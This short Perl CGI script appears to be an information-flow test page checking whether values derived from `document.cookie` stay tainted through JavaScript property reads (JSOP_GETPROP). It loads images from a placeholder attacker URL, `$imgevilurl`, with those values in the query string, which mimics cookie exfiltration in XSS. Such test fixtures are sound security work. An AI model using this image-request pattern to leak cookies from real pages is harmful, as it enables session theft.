#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_GETPROP";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 43;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = 42;
		var dut = { 'x' : 7 };
		var dut2 = { 'x' : 7 };
		var dut3 = { 'x' : evil };

		// shouldn't be evil 
		notevil = dut.x;
		
		var url = "$imgevilurl?normal=" + notevil;
		document.images[0].src = url;
		
		// if with evil val 
		if ($evil) {
			notevil2 = dut2.x;
		}
		
		var url2 = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url2;
		
		// normal usage 	
		notevil3 = dut3.x;
		var url3 = "$imgevilurl?isevil=" + notevil3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
